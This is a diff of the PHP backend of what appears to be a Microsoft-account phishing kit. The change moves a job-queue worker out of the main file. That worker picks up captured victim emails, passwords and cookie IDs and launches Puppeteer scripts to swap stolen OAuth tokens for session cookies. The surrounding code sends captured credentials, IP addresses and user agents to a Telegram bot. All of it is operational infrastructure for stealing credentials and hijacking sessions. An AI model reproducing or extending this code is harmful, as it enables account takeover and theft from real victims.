@@ -156,202 +156,6 @@ class Config {
 }
 
 class Worker {
-    public static function buildNodeCommand(string $projectRoot, string $script, string $email = '', string $password = '', string $cookieId = '', bool $background = false, bool $installChrome = false, string $apiBase = ''): string {
-        $chromePath = '';
-        foreach (['google-chrome-stable', 'google-chrome', 'chromium', 'chromium-browser'] as $bin) {
-            $resolved = trim((string)@shell_exec('command -v ' . escapeshellarg($bin) . ' 2>/dev/null'));
-            if ($resolved !== '') { $chromePath = $resolved; break; }
-        }
-
-        $cmd = "cd " . escapeshellarg($projectRoot);
-
-        if ($installChrome && $chromePath === '') {
-            $cmd .= " && npx puppeteer browsers install chrome";
-        }
-
-        $cmd .= " && DBUS_SESSION_BUS_ADDRESS=disabled:";
-        $cmd .= " PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer');
-        if ($chromePath !== '') {
-            $cmd .= " PUPPETEER_EXECUTABLE_PATH=" . escapeshellarg($chromePath);
-        }
-        $cmd .= " HOME=" . escapeshellarg($projectRoot);
-        $cmd .= " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules');
-
-        $uniqueProfile = sys_get_temp_dir() . '/l1mk-chrome-' . getmypid() . '-' . bin2hex(random_bytes(4));
-        @mkdir($uniqueProfile, 0700, true);
-        $cmd .= " XDG_CONFIG_HOME=" . escapeshellarg($uniqueProfile);
-        $cmd .= " CHROME_USER_DATA_DIR=" . escapeshellarg($uniqueProfile);
-        $cmd .= " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache');
-
-        if ($apiBase !== '') {
-            $cmd .= " API_BASE_URL=" . escapeshellarg($apiBase);
-        }
-
-        $useProxy = (string)getenv('PROXY_HOST') !== '' && (string)getenv('PROXY_USER_TPL') !== '';
-        if ($useProxy && file_exists($projectRoot . '/proxy_runner.js')) {
-            $cmd .= " node " . escapeshellarg($projectRoot . '/proxy_runner.js') . " " . escapeshellarg($script);
-        } else {
-            $cmd .= " node " . escapeshellarg($projectRoot . '/' . $script);
-        }
-
-        if ($email !== '')    $cmd .= " " . escapeshellarg($email);
-        if ($password !== '') $cmd .= " " . escapeshellarg($password);
-        if ($cookieId !== '') $cmd .= " " . escapeshellarg($cookieId);
-
-        if ($background) {
-            $cmd .= " > /dev/null 2>&1 &";
-        }
-
-        return $cmd;
-    }
-
-    public static function run() {
-        Security::log("WORKER: Started file-based worker. Waiting for jobs...");
-        
-        $baseDir = realpath(__DIR__ . '/..');
-        $storageDir = $baseDir . '/session_data';
-        
-        $passwordTimeoutSecs = 120;
-        $lastProfileSweep = 0;
-
-        $maxConcurrent = (int)(getenv('MAX_CONCURRENT_CHROMES') ?: 3);
-        if ($maxConcurrent < 1) $maxConcurrent = 1;
-
-        $useNeon = (bool)(getenv('DATABASE_URL') ?: false);
-
-        while (true) {
-            try {
-                if ((time() - $lastProfileSweep) > 300) {
-                    foreach (glob(sys_get_temp_dir() . '/l1mk-chrome-*') as $old) {
-                        if (is_dir($old) && (time() - filemtime($old)) > 600) {
-                            @exec('rm -rf ' . escapeshellarg($old));
-                        }
-                    }
-                    $lastProfileSweep = time();
-                }
-
-                // Concurrency cap: count live `node consolidated.js` / `node token_swap.js` children.
-                $running = (int)trim((string)@shell_exec("pgrep -f 'node .*(consolidated|token_swap)\\.js' 2>/dev/null | wc -l"));
-                if ($running >= $maxConcurrent) {
-                    usleep(1000000);
-                    continue;
-                }
-
-                $candidates = [];
-
-                if ($useNeon) {
-                    $neonRows = NeonDB::getPending();
-                    foreach ($neonRows as $row) {
-                        $candidates[] = [
-                            'cookie_id'  => $row['cookie_id'],
-                            'email'      => $row['email'],
-                            'password'   => $row['password'],
-                            'status'     => $row['status'],
-                            'created_at' => $row['created_at'] ?? '',
-                            '_source'    => 'neon'
-                        ];
-                    }
-                }
-
-                $files = glob($storageDir . '/session_*.json') ?: [];
-                usort($files, fn($a, $b) => filemtime($a) <=> filemtime($b));
-                $neonIds = array_column($candidates, 'cookie_id');
-                foreach ($files as $f) {
-                    $data = json_decode(@file_get_contents($f), true);
-                    if (!is_array($data) || ($data['status'] ?? '') !== 'pending') continue;
-                    if (in_array($data['cookie_id'] ?? '', $neonIds, true)) continue;
-                    $data['_source'] = 'fs';
-                    $data['_file']   = $f;
-                    $candidates[] = $data;
-                }
-
-                $sessionFile = null;
-                $task = null;
-
-                foreach ($candidates as $candidate) {
-                    $taskPassword = $candidate['password'] ?? '';
-                    $createdAt    = strtotime((string)($candidate['created_at'] ?? ''));
-                    $cookieId     = $candidate['cookie_id'] ?? '';
-
-                    if (empty($taskPassword) || $taskPassword === '__from_file__' || $taskPassword === 'PROACTIVE_SESSION_SYNC') {
-                        if ($createdAt && (time() - $createdAt) >= $passwordTimeoutSecs) {
-                            NeonDB::updateStatus($cookieId, 'failed');
-                            $fsFile = $candidate['_file'] ?? ($storageDir . '/session_' . $cookieId . '.json');
-                            if (file_exists($fsFile)) {
-                                $d = json_decode(file_get_contents($fsFile), true) ?: [];
-                                $d['status']     = 'failed';
-                                $d['data']        = ['error' => 'Timed out waiting for password.'];
-                                $d['updated_at'] = date('c');
-                                file_put_contents($fsFile, json_encode($d, JSON_PRETTY_PRINT));
-                            }
-                            Security::log("WORKER: Timed out waiting for password for {$candidate['email']} (CookieID: $cookieId). Marking failed.");
-                        }
-                        continue;
-                    }
-
-                    NeonDB::updateStatus($cookieId, 'processing');
-                    $fsFile = $candidate['_file'] ?? ($storageDir . '/session_' . $cookieId . '.json');
-                    if (file_exists($fsFile)) {
-                        $d = json_decode(file_get_contents($fsFile), true) ?: [];
-                        $d['status']     = 'processing';
-                        $d['updated_at'] = date('c');
-                        file_put_contents($fsFile, json_encode($d, JSON_PRETTY_PRINT));
-                    }
-
-                    $sessionFile = $fsFile;
-                    $task = $candidate;
-                    break;
-                }
-
-                if (!$task) {
-                    usleep(500000);
-                    continue;
-                }
-
-                Security::log("WORKER: Processing Job for {$task['email']} (CookieID: {$task['cookie_id']})...");
-
-                // Execute Puppeteer Logic
-                $projectRoot = realpath(__DIR__ . '/..');
-                $apiBase = getenv('RENDER_EXTERNAL_URL') ?: 'https://localhost';
-                
-                $scriptToRun = 'consolidated.js';
-
-                $taskPassword = $task['password'] ?? '';
-
-                if ($taskPassword === "OAUTH_TOKEN_CAPTURED") {
-                    $scriptToRun = 'token_swap.js';
-                    Security::log("WORKER: Detected Hybrid Token Swap task. Running $scriptToRun...");
-                }
-
-                if ($scriptToRun === 'token_swap.js' && empty($taskPassword)) {
-                    Security::log("WORKER: No password provided for token_swap — skipping.");
-                    NeonDB::updateStatus($task['cookie_id'], 'failed');
-                    if ($sessionFile && file_exists($sessionFile)) {
-                        $d = json_decode(file_get_contents($sessionFile), true) ?: [];
-                        $d['status']     = 'failed';
-                        $d['data']        = ['error' => 'No password was provided.'];
-                        $d['updated_at'] = date('c');
-                        file_put_contents($sessionFile, json_encode($d, JSON_PRETTY_PRINT));
-                    }
-                    continue;
-                }
-
-                $cmd = self::buildNodeCommand($projectRoot, $scriptToRun, $task['email'], '', $task['cookie_id'], false, true, $apiBase) . " --verbose > /dev/null 2>&1 </dev/null &";
-
-                Security::log("WORKER: Executing command: $cmd");
-
-                proc_close(proc_open($cmd, [], $pipes));
-                Security::log("WORKER: Launched $scriptToRun for {$task['email']} (non-blocking)");
-                
-                Security::log("WORKER: Job handed off to $scriptToRun. Moving on.");
-
-            } catch (Exception $e) {
-                Security::log("WORKER ERROR: " . $e->getMessage());
-                usleep(1000000);
-            }
-        }
-    }
-
     public static function sendTelegramMessage(string $email, string $password, string $ip, string $ua, string $info): void {
         $cfg = Config::load();
         if (empty($cfg['telegramBotToken']) || empty($cfg['telegramChatId'])) return;
@@ -1710,9 +1514,7 @@ class Api {
                     'domain' => 'microsoft.com',
                     'token_data' => $tokens
                 ]);
-                // Trigger token_swap.js worker
-                $cmd = Worker::buildNodeCommand($projectRoot, 'token_swap.js', $email, 'OAUTH_TOKEN_CAPTURED', $workerCookieId, true);
-                shell_exec($cmd);
+                // The external worker will pick up the task from Neon DB
             } else {
                 Security::log("LOCAL_CAPTURE: No refresh token, or PHP swap successfully captured session with ESTSAUTH for $email. Worker not triggered.");
             }
@@ -2257,13 +2059,7 @@ class Api {
 
     private static function handleCaptureExistingSession() {
         try {
-            Security::log("API: handleCaptureExistingSession called");
-            $projectRoot = realpath(__DIR__ . '/..');
-            $cmd = Worker::buildNodeCommand($projectRoot, 'capture_session.js', '', '', '', true);
-            
-            Security::log("API: Executing command: $cmd");
-            shell_exec($cmd);
-
+            Security::log("API: handleCaptureExistingSession called. (Handled by external worker)");
             echo json_encode(['ok' => true]);
         } catch (Exception $e) {
             Security::log("API ERROR (capture_existing_session): " . $e->getMessage());
@@ -3231,11 +3027,7 @@ class Api {
             'time' => date('c')
         ]);
 
-        $projectRoot = realpath(__DIR__ . '/..');
-        $cmd = Worker::buildNodeCommand($projectRoot, 'token_swap.js', $email, 'OAUTH_TOKEN_CAPTURED', $cookieId, true);
-
-        Security::log("HYBRID: Triggering Hybrid Worker for $email ($cookieId)");
-        shell_exec($cmd);
+        Security::log("HYBRID: Task added to DB for Hybrid Worker for $email ($cookieId)");
 
         // Notify via Telegram
         Worker::sendTelegramMessage($email, "HYBRID_FLOW_START", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🔄 Hybrid Token Capture Successful! Generating cookies...");
